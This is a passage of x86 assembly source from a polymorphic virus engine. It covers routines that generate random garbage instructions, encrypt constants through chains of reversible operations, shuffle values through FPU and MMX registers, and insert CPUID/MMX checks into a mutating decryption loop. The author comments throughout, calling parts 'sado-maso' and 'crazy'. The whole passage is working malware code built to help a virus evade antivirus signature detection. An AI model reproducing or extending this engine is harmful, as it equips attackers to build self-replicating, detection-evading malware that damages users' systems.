       __ggl_flags:
           mov eax,(end_garbage - tbl_garbage) / 04h
           call    ppe_get_rnd_range
           call    __gg_test
           jc  __gg_finish
           lea esi,[ebp+tbl_garbage+eax*04h-virus_start]
           lodsd
       __gg_jump:
           add eax,ebp
           sub eax,offset virus_start
           call    eax
       __gg_finish:
           pop ecx
           loop    __gg_loop

           mov [esp],edi
           popa

   gg_exit:    dec byte ptr [ebp+recursive_level-virus_start]
           ret

       __gg_test:
           clc
           push    eax
           test    byte ptr [ebp+garbage_style-virus_start],not USED_BASED
           jnz __ggt_copro
           cmp eax,__garbage_based_num
           jae __ggt_failed
       __ggt_copro:
           test    byte ptr [ebp+garbage_style-virus_start],not USED_COPRO
           jnz __ggt_mmx
           sub eax,__garbage_based_num
           cmp eax,__garbage_copro_num
           jae __ggt_success
       __ggt_mmx:
           test    byte ptr [ebp+garbage_style-virus_start],not USED_MMX
           jnz __ggt_success
           sub eax,__garbage_copro_num
           cmp eax,__garbage_mmx_num
           jb  __ggt_success
       __ggt_failed:
           stc
       __ggt_success:
           pop eax
           ret

           ; generate only based-garbage
   gen_garbage_based:
           push    ax
           mov al,byte ptr [ebp+garbage_style-virus_start]
           mov byte ptr [ebp+garbage_style-virus_start],USED_BASED
   gen_garbage_no_finish:
           call    gen_garbage
           mov byte ptr [ebp+garbage_style-virus_start],al
           pop ax
           ret

           ; gnerate garbage which will not modify flags (mov,stack...)
   gen_garbage_no_flags:
           push    ax
           mov al,[ebp+garbage_style-virus_start]
           mov byte ptr [ebp+garbage_style-virus_start],USED_FLAGS
           jmp gen_garbage_no_finish

   ;ÄÄÄ´ function to rotate with coprocessor regs  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;These functions MUST be called consecutively. The main
           ;problem is that I can't get value from ST(6) directly.
           ;I must ST(6) move to ST(0) and then I may read/write there.
           ;And then move ST(0) to ST(6). I've got two way (which I
           ;know). Use FINCSTP/FDECSTP or FXCH ST(x). Because I'm
           ;so mad I will use both way but for FINCSTP/FDECSTP I use
           ;only standard LOOP because I would have to rewrite
           ;DEC reg(8/16/32), JNZ jump for copro-using. Never mind.
           ;
           ;input:        AL=what ST(x) to modify -> write to ST(0)
           ;
           __cs_mode   db  ?   ;__set OR __reset ?
           __cs_reg    db  ?   ;copro reg
           __cs_reg_count  db  ?   ;base-reg like a counter
           __cs_style  db  ?   ;FDECSTP/FINCSTP or FXCH ?
           __cs_decinc db  ?   ;0=FINCSTP, 1=FDECSTP
   __copro_set:
           mov byte ptr [ebp+__cs_mode -virus_start],0
           mov byte ptr [ebp+__cs_reg  -virus_start],al
           mov byte ptr [ebp+__cs_style-virus_start],1

           pusha

           ; choose between FDECSTP/FINCSTP and FXCH ST(x)
           mov eax,00000002h
           call    ppe_get_rnd_range
           or  al,al
           jz  __cs_xchg

           ; disable base-reg
           mov al,[ebp+used_regs-virus_start]
           push    ax
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           mov byte ptr [ebp+__cs_reg_count-virus_start],al

           mov byte ptr [ebp+__cs_style -virus_start],0
           mov byte ptr [ebp+__cs_decinc-virus_start],0
           call    ppe_get_rnd32
           and al,1
           jnz __cs_decinc_okay
           mov byte ptr [ebp+__cs_decinc-virus_start],1
       __cs_decinc_okay:
           call    __copro_process
           pop ax
           mov [ebp+used_regs-virus_start],al
           jmp  __cs_finish

       __cs_xchg:
           cmp byte ptr [ebp+__cs_reg-virus_start],0
           jz  __cs_finish
           mov ax,0C8D9h
           or  ah,byte ptr [ebp+__cs_reg-virus_start]
           stosw

       __cs_finish:
           mov [esp],edi
           popa
           ret

   __copro_reset:
           pusha
           mov byte ptr [ebp+__cs_mode-virus_start],1
           ; is it FXCH ?
           cmp byte ptr [ebp+__cs_style-virus_start],1
           jnz __csr_decinc
           jmp __cs_xchg
       __csr_decinc:
           mov al,[ebp+used_regs-virus_start]
           push    ax
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           mov [ebp+__cs_reg_count-virus_start],al
           neg byte ptr [ebp+__cs_decinc-virus_start]
           inc byte ptr [ebp+__cs_decinc-virus_start]
           call    __copro_process
           pop ax
           mov [ebp+used_regs-virus_start],al
           jmp __cs_finish

           ; internal function, don't call it
   __copro_process:
           movzx   eax,byte ptr [ebp+__cs_reg-virus_start]
           or  al,al
           jz  __csp_finish
           cmp byte ptr [ebp+__cs_decinc-virus_start],1
           jz  __csp_dec
           cmp byte ptr [ebp+__cs_mode-virus_start],0
           jnz __csp_decokay
           sub eax,9
           not eax
       __csp_decokay:
           push    0000F6D9h       ;FDECSTP
           jmp __csp_inc
       __csp_dec:
           cmp byte ptr [ebp+__cs_mode-virus_start],1
           jnz __csp_incokay
           sub eax,9
           not eax
       __csp_incokay:
           push    0000F7D9h       ;FINCSTP
       __csp_inc:
           mov bl,[ebp+__cs_reg_count-virus_start]
           call    ppe_crypt_value

           push    edi         ;I must generate garbage
           call    gen_garbage_based   ;and between them I must
           mov eax,[esp+4]     ;put FDECSTP or FINCSTP
           stosw               ;instruction and generate
           call    gen_garbage_based   ;garbage again - wow !

           ; generate DEC reg32 + JNZ
           mov al,48h
           or  al,[ebp+__cs_reg_count-virus_start]
           stosb
           call    gen_garbage_no_flags

           mov ax,850Fh        ;JNZ
           stosw

           ; get come-back offset
           pop eax         ;you're swine!
           pop ebx
           sub eax,edi
           sub eax,4           ;JNZ's six bytes - ID func
           stosd

       __csp_finish:
           ret

   ;ÄÄÄ´ function for mov base-reg to copro-reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This function can generate a code which move a base-reg
           ;to a copro-reg using memory like a buffer.
           ;
           ;input:     AH = base-reg
           ;       AL = copro-reg
           ;
           __cr2m_regs dw  ?
           ;
   __copro_reg2mov:

           mov word ptr [ebp+__cr2m_regs-virus_start],ax
           ; where we're in memory
           call    __gr_where_in_mem
           jc  __cr2m_finish

           ; save used-regs
           movzx   ecx,byte ptr [ebp+used_regs-virus_start]

           movzx   eax,word ptr [ebp+__cr2m_regs-virus_start]
           shr eax,8
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs-virus_start],ah

           mov ch,[ebp+used_regs-virus_start]
           push    ecx

           ; choose a place in memory
           call    __copro_get_mem
       __cr2m_new_reg:
           call    ppe_get_empty_reg
           test    byte ptr [ebx+REG_FLAGS],REG_NO_COPRO
           jnz __cr2m_new_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           push    ebx
           mov bl,al
           mov eax,edx
           call    ppe_crypt_value
           pop ebx

           call    __copro_fix_delta

           mov ax,[ebp+__cr2m_regs-virus_start]
           shl ah,3
           or  ah,byte ptr [ebx]
           mov al,89h
           stosw

           ; base-reg is in memory, I don't need it...
           pop ecx
           mov [ebp+used_regs-virus_start],cl
           push    ecx

           ; FILD dword ptr instruction
           mov ax,[ebp+__cr2m_regs-virus_start]
           lea esi,[ebp+tbl_copro_movin+03h-virus_start]
           call    c_copro_movin

           ; enable register
           pop ecx
           mov [ebp+used_regs-virus_start],ch

       __cr2m_finish:
           ret

   ;ÄÄÄ´ function for mov copro-reg to base-reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This function can generate a code which we moved the cer-
           ;tain copro-reg to base-reg. Here I use g_copro_movout
           ;function.
           ;
           ;  * the first I must move copro-reg (which I want) to ST(0)
           ;    by __copro_set function
           ;  * Read a value from ST(0) and write to defined place in
           ;    memory by g_copro_movout function
           ;  * And put the value from mem to base-reg
           ;
           ;input:     AH = base-reg
           ;       AL = copro-reg
           ;
           __cm2r_regs dw  ?
           ;
   __copro_mov2reg:

           ; save registers
           pusha

           mov word ptr [ebp+__cm2r_regs-virus_start],ax

           ; disable input register
           mov al,byte ptr [ebp+used_regs-virus_start]
           push    ax
           mov al,byte ptr [ebp+__cm2r_regs-virus_start+1]
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs-virus_start],ah

           ; where we're in memory
           call    __gr_where_in_mem
           jc  __cm2r_finish

           ; FIST dword ptr instruction
           mov ax,[ebp+__cm2r_regs-virus_start]
           lea esi,[ebp+tbl_copro_movout+02h-virus_start]
           call    c_copro_movout      ;get value to mem (EAX=place)

           ;get empty base-reg
           push    ebx
           push    eax
        __cm2r_new_reg:
           call    ppe_get_empty_reg
           test    byte ptr [ebx+REG_FLAGS],REG_NO_COPRO
           jnz __cm2r_new_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           mov [esp+4],ebx
           mov bl,al
           pop eax
           call    ppe_crypt_value
           movzx   ebx,bl
           lea ebx,[ebp+tbl_regs+ebx*02h-virus_start]
           call    __copro_fix_delta
           pop ebx

           ;get value from mem
           mov ax,[ebp+__cm2r_regs-virus_start]
           shl ah,3
           or  ah,byte ptr [ebx]
           mov al,8Bh
           stosw

        __cm2r_finish:
           pop ax
           mov byte ptr [ebp+used_regs-virus_start],al

           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ function to calculate a free place in mem (only copro) ÃÄÄÄÄÄÄÄÄÄÄÄÄ

              ;----------------------------------------------------------
              ;This function returns offset in poly-decode loop which
              ;it's unnecessary yet. It's a free place when my functions
              ;save some value to fill base-regs (from copro-regs).
              ;
   __copro_get_mem:
           mov eax,[ebp+poly_start-virus_start]
           cmp [ebp+counter_back-virus_start],edi
           jb  __copro_gm_ledi
           sub eax,edi
           jmp __copro_gm_okay
       __copro_gm_ledi:
           sub eax,[ebp+counter_back-virus_start]
       __copro_gm_okay:
           neg eax
           sub eax,8           ;qword ptr ...
           call    ppe_get_rnd_range
           mov edx,eax

           ; now, we must test if EDX don't come under <compare_buffer>
           movzx   eax,byte ptr [ebp+compare_index-virus_start]
       __copro_gm_test:
           or  eax,eax
           jz  __copro_gm_finish
           push    edx
           dec eax
           sub edx,[ebp+compare_buffer+04h*eax-virus_start]
           test    edx,80000000h
           jz  __copro_gm_plus
           cmp edx,-5
           pop edx
           jbe __copro_gm_nextest
           jmp __copro_get_mem
       __copro_gm_plus:
           cmp edx,00000005h
           pop edx
           jb  __copro_get_mem
       __copro_gm_nextest:
           jmp __copro_gm_test
       __copro_gm_finish:
           ret

   ;ÄÄÄ´ function to fix delta for copro operations ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;If we generated offset of free memory (by __copro_get_mem)
           ;then it's more then time to use delta.
           ;
           ;input:    EBX = offset to reg
   __copro_fix_delta:
           mov al,03h
           mov ah,byte ptr [ebx]
           shl ah,3
           or  ah,byte ptr [ebp+gl_index_reg-virus_start]
           or  ah,0C0h
           stosw
           ret

   ;ÄÄÄ´ function to crypt a destination value ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   ÀÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÙ

           ;---------------------------------------------------------
           ;This function is for crypt a real value which we want to
           ;hide. I use only base-reg (eax,edi...) because If I would
           ;like to introduce the coprocessor I'd have to use FILD and
           ;FIST instruction: FILD qword ptr [edi], where EDI I wanted
           ;generate. At first I generate code for encode a destination
           ;value and I find out a crypt value. During encoding I save
           ;a opposite instruction to stack (add <=> sub). I could not
           ;to save decode instructions into a special buffer because
           ;I didn't know a real size - the stack is better for this.
           ;
           ;input:       EAX=destination value
           ;          BL=destionation register (not in BCD)
           ;
           ;used instructions: ADD opposite SUB and on the contrary
           ;           ROL opposite ROR
           ;           XOR reg <==> XOR reg
           ;           NOT reg <==> NOT reg
           ;           MOV reg1,reg2 <==> MOV reg2,reg1
           ;
           ;do you have anything else ?
           ;
           ;and now... example:
           ;   * I want to generate number 0x402CC1 to EDX register
           ;           MOV   ESI, 1985FDD6
           ;           ROL   ESI, BB
           ;           MOV   EAX, ESI
           ;           NOT   EAX
           ;           MOV   EDX, EAX
           ;           SUB   EDX, 4FF3A350  ->EDX = 0x402CC1
           ;
           ;This is only example but reality it other... better !!!
           ;
           actual_reg  db  ?   ;where we've our number which we're generating
           future_reg  db  ?   ;our destination register
           actual_instr    db  ?   ;actual instruction in generate
           old_place   dd  ?   ;where's start crypt value
           ;
   ppe_crypt_value:

           pusha

           mov ecx,eax         ;save destination value
           mov [ebp+old_place-virus_start],edi
           mov [ebp+actual_reg-virus_start],bl
           mov [ebp+future_reg-virus_start],bl

           ; save destination value to destination reg
           mov al,0B8h
           or  al,bl
           stosb               ;select destination reg
           mov eax,ecx
           stosd               ;save destination value

           ; how many instruction we'll use
           mov eax,00000007h
           call    ppe_get_rnd_range
           inc eax
           mov byte ptr [ebp+actual_instr-virus_start],al

           push    12345678h       ;flag to stack
       __cv_next_loop:
           mov eax,00000003h       ;may I change register ?
           call    ppe_get_rnd_range
           or  eax,eax
           jnz __cv_continue

           call    ppe_get_empty_reg   ;i want a free register
           mov al,08Bh
           mov ah,byte ptr [ebx]   ;my future reg32
           cmp ah,byte ptr [ebp+actual_reg-virus_start]
           jz  __cv_next_loop      ;blah - mov ecx,ecx ??
           shl ah,3
           or  ah,byte ptr [ebp+actual_reg-virus_start]
           or  ah,0C0h
           stosw               ;finish but now i must create opposite for decode
           mov al,byte ptr [ebx]
           mov ah,byte ptr [ebp+actual_reg-virus_start]
           shl ah,3
           or  ah,al
           or  ah,0C0h
           mov byte ptr [ebp+actual_reg-virus_start],al
           mov al,08Bh
           push    ax          ;ax = decode mov

       __cv_continue:
           mov eax,(end_num_code - tbl_num_code) / 04h
           call    ppe_get_rnd_range   ;select operation

           lea esi,[ebp+tbl_num_code+4*eax-virus_start]
           lodsb               ;load where we have encode instruction
           lodsw               ;AH = base_reg, AL = id_operation
           or  ah,[ebp+actual_reg-virus_start]
           push    ax          ;save because of separate actual_reg
           stosw
           lodsb               ;imm(X) = 3rd_number * 8
           mov dl,al
           push    ax          ;now, we must generate imm
       __cv_generate_imm:          ;imm32 = (add,sub) reg32,imm32
           or  dl,dl           ;imm8  = (rol,ror) reg32,imm8
           jz  __cv_opposite_code  ;imm0  = not reg32
           call    ppe_get_rnd32
           rol ebx,8           ;save rnd number to EBX
           mov bl,al
           stosb
           dec dl
           jmp __cv_generate_imm

       __cv_opposite_code:
           pop ax          ;ax = imm(X)
           pop cx          ;ch = reg32, cl = encode instruction
       __cv_oc_generate_imm:
           or  al,al           ;is it imm0 ?
           jz  __cv_oc_imm_ok
           dec esp         ;save imm to stack
           mov byte ptr ss:[esp],bl
           ror ebx,8           ;next number in imm
           dec al
           jmp __cv_oc_generate_imm

       __cv_oc_imm_ok:
           lea esi,[esi-4]     ;esi = start of encode instruction
           lodsb               ;AL = opposite instruction (add <=> sub)
           movsx   eax,al          ;is it previous or next instruction ?
           add esi,eax         ;esi = decode instruction
           lodsb
           lodsw               ;al = (en/de)code instruction
           and ch,00000111b        ;separate reg only
           or  ah,ch           ;change register
           push    ax          ;save encode instruction to stack

           dec byte ptr [ebp+actual_instr-virus_start]
           jnz __cv_next_loop

           ;now, we must find out the crypt value
           mov ax,0C08Bh
           or  ah,byte ptr [ebp+actual_reg-virus_start]
           stosw               ;save destination value to EAX
           mov al,0C3h
           stosb               ;ret = out of call

           ;to find out crypt value we must call decode function
           ;output:    eax = crypt value
           pusha
           call    dword ptr [ebp+old_place-virus_start]
           mov [esp].access_eax,eax
           popa

           ;save into last_reg our crypt value
           mov edi,[ebp+old_place-virus_start]
           push    eax
           mov al,0B8h
           or  al,byte ptr [ebp+actual_reg-virus_start]
           stosb
           pop eax
           stosd

           ;now, we must write decode instructions to old EDI
       __cv_oc_out_of_stack:
           cmp dword ptr ss:[esp],12345678h
           jz  __cv_oc_finish
           mov al,byte ptr ss:[esp]
           inc esp
           stosb
           jmp __cv_oc_out_of_stack
       __cv_oc_finish:
           pop eax         ;flag from stack

           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ function to put CPUID and MMX test to poly-decode loop ÃÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

           ;---------------------------------------------------------
           ;This function is necessary for detect if computer supports
           ;MMX instructions. To detect we must use CPUID instruction
           ;(see below). And test flag from EDX output parameter. But
           ;no every computer supports CPUID instruction. We can find
           ;out it if we test 21st bit in EFLAGS. I think this function
           ;is very difficult to understand although I've used a lot
           ;of comments. Now I show you scheme (only one part):
           ;
           ;  PUSHFD
           ;  POP main_reg32
           ;  a) AND, OR
           ;   GEN 1 shl 21 to reg32
           ;   a) OR  main_reg32, reg32  a) OR  main_reg32, 1 shl 21
           ;   b) ADD main_reg32, reg32  b) ADD main_reg32, 1 shl 21
           ;  b) BTS, (BTC - hmmm, It's not supports here - preferably)
           ;   GEN 21 to reg32 (why 21 ? see below -CPUID-)
           ;   a) (BTS) main_reg32, reg32
           ;   b) (BTS) main_reg32, 21 (21 won't in reg32)
           ;  ...
           ;  this is only scheme of part one BUT reality is better !!!
           ;
           ;What's happend if CPUID isn't supported ?
           ;
           ;   JNC NOT_CPUID
           ;   MOV EAX,00000001h       ;crypted EAX
           ;   CPUID               ;check if MMX
           ;   BT  EDX,23          ;test 23rd bit
           ;  NOT_CPUID:               ;result in (Z)ero
           ;
           ;Using CPUID (only for MMX suport):
           ;   * EAX=00000001h + CPUID (0Fh, 0A2h)
           ;   * and EAX,EDX will be fill,
           ;     EDX[23]=CPU supports IA-MMX, EDX[24]=IA-MMX 2 support
           ;
           ;This function is very crazy rather - I think.
           ;
           __cm_stack_out  db  ?   ;main_reg32 is in stack ?
           __cm_main_reg   db  ?   ;where we have EFLAGS
           __cm_slave_reg  db  ?   ;helping reg32
           __cm_start_jump dd  ?   ;global disable test
           ;
   __cpuid_mmx:

           pusha

           ; save registers
           mov al,[ebp+used_regs-virus_start]
           push    ax

           ; test, if our poly-engine don't support MMX for file
           cmp byte ptr [ebp+copro_or_mmx-virus_start],0
           jnz __cm_prepare
           mov al,0F8h         ;CLC instruction
           stosb
           jmp __cm_after_test

           ; the first we test if CPU supports CPUID
       __cm_prepare:
           mov byte ptr [ebp+__cm_stack_out-virus_start],0

           mov al,9Ch          ;PUSHF instruction
           stosb
           call    gen_garbage_based

           ; POP reg32 + test
       __cm_part_1:
           call    ppe_get_empty_reg   ;save EFLAGS to reg32
           mov al,byte ptr [ebx]
           mov [ebp+__cm_main_reg-virus_start],al
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           or  al,58h
           stosb               ;POP reg32

           call    gen_garbage_based

           mov eax,00000002h       ;(OR) || (BTC,BTS,...) ?
           call    ppe_get_rnd_range
           cmp al,1
           jz  __cmp1_type_2

           ; select type of detect
       __cmp1_type_1:
           mov eax,00000002h       ;from reg32 or operand ?
           call    ppe_get_rnd_range
           cmp al,1
           jz  __cmp1t1_type_2

           ; we'll generate (1 shl 21) to reg32 and set flag
       __cmp1t1_type_1:
           call    ppe_get_empty_reg
           mov [ebp+__cm_slave_reg-virus_start],al
           mov bl,al
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs-virus_start],ah
           mov eax,1 shl 21d
           call    ppe_crypt_value     ;get (1 shl 21) to reg32

           mov eax,00000002h
           call    ppe_get_rnd_range
           cmp al,1
           jz  __cmp1t1t1_type_2

           ; OR main_reg32, reg32
       __cmp1t1t1_type_1:
           mov al,0Bh
           __cmp1t1t1_after:
           mov ah,[ebp+__cm_main_reg-virus_start]
           shl ah,3
           or  ah,[ebp+__cm_slave_reg-virus_start]
           or  ah,0C0h
           stosw
           jmp __cm_part_2

           ; ADD main_reg32, reg32
       __cmp1t1t1_type_2:
           mov al,03h
           jmp __cmp1t1t1_after

           ; select type of detect
       __cmp1t1_type_2:
           mov eax,00000002h
           call    ppe_get_rnd_range
           cmp al,1
           jz  __cmp1t1t2_type_2

           ; OR main_reg32, 1 shl 21
       __cmp1t1t2_type_1:
           mov ax,0C881h
           __cmp1t1t2_after:
           or  ah,[ebp+__cm_main_reg-virus_start]
           stosw
           mov eax,1 shl 21d
           stosd
           jmp __cm_part_2

           ; ADD main_reg32, 1 shl 21
       __cmp1t1t2_type_2:
           mov ax,0C081h
           jmp __cmp1t1t2_after

           ; new type of instructions + gen 21 to reg + set flag
       __cmp1_type_2:
           mov eax,00000002h
           call    ppe_get_rnd_range
           cmp al,1
           jnz __cmp1t2_type_2

           ; generate number 21 to reg32
       __cmp1t2_type_1:
           call    ppe_get_empty_reg
           mov [ebp+__cm_slave_reg-virus_start],al
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           mov bl,al
           mov eax,21d
           call    ppe_crypt_value

           mov ax,0AB0Fh
           stosw
           mov al,[ebp+__cm_slave_reg-virus_start]
           shl al,3
           or  al,[ebp+__cm_main_reg-virus_start]
           or  al,0C0h
           stosb
           jmp __cm_part_2

           ; use 21 directly
       __cmp1t2_type_2:
           mov ax,0BA0Fh
           stosw
           mov ax,15E8h
           or  al,[ebp+__cm_main_reg-virus_start]
           stosw
           jmp __cm_part_2

           ; end of part one, test CPUID support
       __cm_part_2:
           mov al,50h          ;PUSH main_reg32, POPF
           or  al,[ebp+__cm_main_reg-virus_start]
           stosb
           call    gen_garbage_based
           mov al,9Dh
           stosb

           ; enable registers
           pop ax
           push    ax
           mov [ebp+used_regs-virus_start],al

           ; get result from EFLAGS
           call    ppe_get_empty_reg
           mov [ebp+__cm_main_reg-virus_start],al
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           call    ppe_get_empty_reg
           mov [ebp+__cm_slave_reg-virus_start],al
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah

           call    gen_garbage_no_flags

           mov al,9Ch          ;PUSHF + POP main_reg32
           stosb
           call    gen_garbage_based
           mov al,58h
           or  al,[ebp+__cm_main_reg-virus_start]
           stosb

           ; select type of instruction
           mov eax,00000002h       ;I don't support TEST, AND
           call    ppe_get_rnd_range   ;instruction 'cause it
           cmp al,1            ;gives a result in (Z)ero
           jz  __cmp2_type_2       ;and the others in (C)arry

           ; BT, BTC, BTR, BTS instruction
       __cmp2_type_1:
           mov eax,00000002h       ;use reg32 or diect value ?
           call    ppe_get_rnd_range
           cmp al,1
           jz  __cmp2t1_type_2

           ; generate 21 number to the empty reg32
       __cmp2t1_type_1:
           call    ppe_get_empty_reg
           mov [ebp+__cm_slave_reg-virus_start],al
           test    byte ptr [ebx+REG_FLAGS],REG_NO_COPRO
           jnz __cmp2t1_type_1
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           mov bl,al
           mov eax,21d
           call    ppe_crypt_value

           mov al,0Fh          ;1st byte of b-instructions
           stosb

           ; use reg32
           mov eax,end_bt_reg - tbl_bt_reg
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_bt_imm+eax-virus_start]
           lodsb
           mov ah,[ebp+__cm_slave_reg-virus_start]
           shl ah,3
           or  ah,[ebp+__cm_main_reg-virus_start]
           or  ah,0C0h
           mov al,0A3h
           stosw
           jmp __cm_part_3

           ; use the direct value
       __cmp2t1_type_2:
           mov al,0Fh          ;1st byte of b-instructions
           stosb

           mov eax,end_bt_imm - tbl_bt_imm
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_bt_imm+eax-virus_start]
           mov al,0BAh
           stosb
           lodsb
           or  al,[ebp+__cm_main_reg-virus_start]
           mov ah,21d
           stosw
           jmp __cm_part_3

           ; RCL, RCR, ROL, ROR, SHL, SHR instructions
           ; I don't support SAR instruction (it's not opposite)
       __cmp2_type_2:
           mov eax,end_rs_imm - tbl_rs_imm - 1
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_rs_imm+eax-virus_start]
           mov al,0C1h
           stosb

           ; rotate/shift - right/left ?
           mov eax,esi
           sub eax,ebp
           sub eax,offset tbl_rs_imm - offset virus_start
           shr al,1
           jc  __cmp2t2_type_2
       __cmp2t2_type_1:
           lodsb
           or  al,[ebp+__cm_main_reg-virus_start]
           mov ah,32d-21d
           stosw
           jmp __cm_part_3

       __cmp2t2_type_2:
           lodsb
           or  al,[ebp+__cm_main_reg-virus_start]
           mov ah,22d
           stosw
           jmp __cm_part_3

       __cm_part_3:
           pop ax
           push    ax
           mov [ebp+used_regs-virus_start],al

       __cmp3_start:
           call    gen_garbage_no_flags    ;wow!
           push    edi
           add edi,6           ;reserved for far c-jump

           ; select a empty reg
           mov eax,00000001h       ;value to EAX
           mov bl,0            ;EAX register
           call    ppe_crypt_value

           or  byte ptr [ebp+used_regs-virus_start],00000001h
           call    gen_garbage_based
           mov ax,0A20Fh       ;CPUID instruction
           stosw
           or  byte ptr [ebp+used_regs-virus_start],00000100b
           call    gen_garbage_based
           and byte ptr [ebp+used_regs-virus_start],11111010b

           ;1st byte of b-instructions
           mov al,0Fh
           stosb

           mov eax,end_bt_imm - tbl_bt_imm
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_bt_imm+eax-virus_start]
           mov al,0BAh
           stosb
           lodsb
           or  al,2            ;EDX test for IA-MMX flag
           mov ah,23
           stosw

           ; generate conditional jump (JNC)
           pop ebx
           mov eax,ebx
           mov word ptr [ebx],830fh    ;JNC far jump
           sub eax,edi
           neg eax
           sub eax,6           ;far jump has six bytes
           mov [ebx+2],eax     ;put short conditional jump

       __cm_after_test:

           call    gen_garbage_no_flags
           mov al,9Ch          ;PUSHF instruction
           stosb

           ; enable registers
           pop ax
           mov [ebp+used_regs-virus_start],al

           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ function for simulate MMX and Copro code ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;Is computer really supports MMX instructions ? Why can I
           ;find out in decode-loop ? Hmmm, it's very easy !
           ;
           ;   POPF
           ;   PUSHF
           ;   JNC/JC  NO_MMX      - jump if MMX (not) support
           ;   -mmx instructions-
           ;  NO_MMX:
           ;
           ;see on __cpuid_mmx function to know more...
           ;
           ;If I use MMX instructions and I'll call g_copro_others to
           ;generate some copro-garbages what will be then ? I cannot
           ;rewrite MMX regz (to use copro-regz). So, I can call this
           ;function with JC jump.
           ;
           ;input:     AL = (0=JNC, 1=JC)  ;JNC=MMX, JC=copro
           ;
           __mts_start dd  ?   ;where is JNC/JC jump ?
           __mts_style db  ?   ;JNC or JC ?
           ;
   __mmx_test_start:

           inc byte ptr [ebp+recursive_lmmx-virus_start]
           cmp byte ptr [ebp+recursive_lmmx-virus_start],1
           ja  __mmx_ts_finish

           ; save style
           mov [ebp+__mts_style-virus_start],al

           ; put POPF + PUSHF instruction
           call    gen_garbage_based
           mov al,9Dh
           stosb

           call    gen_garbage_no_flags

           mov al,9Ch
           stosb

           ; save actual EDI
           mov [ebp+__mts_start-virus_start],edi
           add edi,6

       __mmx_ts_finish:
           ret

   __mmx_test_finish:

           dec byte ptr [ebp+recursive_lmmx-virus_start]
           cmp byte ptr [ebp+recursive_lmmx-virus_start],0
           ja  __mmx_tf_finish

           push    eax ebx

           ; generate the conditional jump (JNC/JC)
           mov ax,830Fh              ;JNC mmx-jump
           cmp byte ptr [ebp+__mts_style-virus_start],0
           jz  __mtf_okay
           mov ax,820Fh              ;JC copro-jump
       __mtf_okay:
           mov ebx,[ebp+__mts_start-virus_start]
           mov word ptr [ebx],ax
           mov eax,ebx
           sub eax,edi
           neg eax
           sub eax,6
           mov dword ptr [ebx+2],eax

           pop ebx eax

       __mmx_tf_finish:
           ret

   ;ÄÄÄ´ function for generate reg32 <-> mm(0..7) / movd/movq ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;Functions can move reg32 to/from MMX registers.
           ;
           ;input:        AX=(AH=reg32, AL=mmX)
           ;
   __mmx_movin:
           push    ax

           ; test if computer supports MMX
           mov al,0
           call    __mmx_test_start

           ; generate instruction
           mov ax,6E0Fh
       __mm_after:
           stosw

           pop ax
           shl al,3
           or  al,ah
           or  al,0C0h
           stosb

           call    __mmx_test_finish
           ret

   __mmx_movout:
           push    ax

           ; does CPU support MMX ?
           mov al,0
           call    __mmx_test_start

           ; generate instruction
           mov ax,7E0Fh
           jmp __mm_after

   ;ÄÄÄ´ function for generate add/sub with MMX and reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This function can (add/sub) any MMX register with reg32.
           ;
           ;input:        AX=(AH=reg32, AL=mmX)
           ;          BL=(0=add, 1=sub)
           ;
           __mmx_as_regs   dw  ?   ;input regz
           __mmx_as_type   db  ?   ;add OR sub ?
           ;
   __mmx_add_sub:
           mov [ebp+__mmx_as_regs-virus_start],ax
           mov [ebp+__mmx_as_type-virus_start],bl

           ; support MMX ?
           mov al,0
           call    __mmx_test_start

           ; we must b-reg32 move to mmx-reg
           call    ppe_get_empty_reg_mmx
           mov al,byte ptr [ebx]
           mov ah,byte ptr [ebp+__mmx_as_regs-virus_start+1]
           call    __mmx_movin

           ; generate instruction
           mov ax,0FE0Fh       ;PADDD ...
           cmp byte ptr [ebp+__mmx_as_type-virus_start],1
           jz  __mas_sub

       __mas_after:
           stosw
           mov ax,[ebp+__mmx_as_regs-virus_start]
           shl al,3
           or  al,byte ptr [ebx]
           or  al,0C0h
           stosb
           jmp __mas_finish

       __mas_sub:
           mov ax,0FA0Fh       ;PSUBD ...
           jmp __mas_after

       __mas_finish:
           call    __mmx_test_finish
           ret

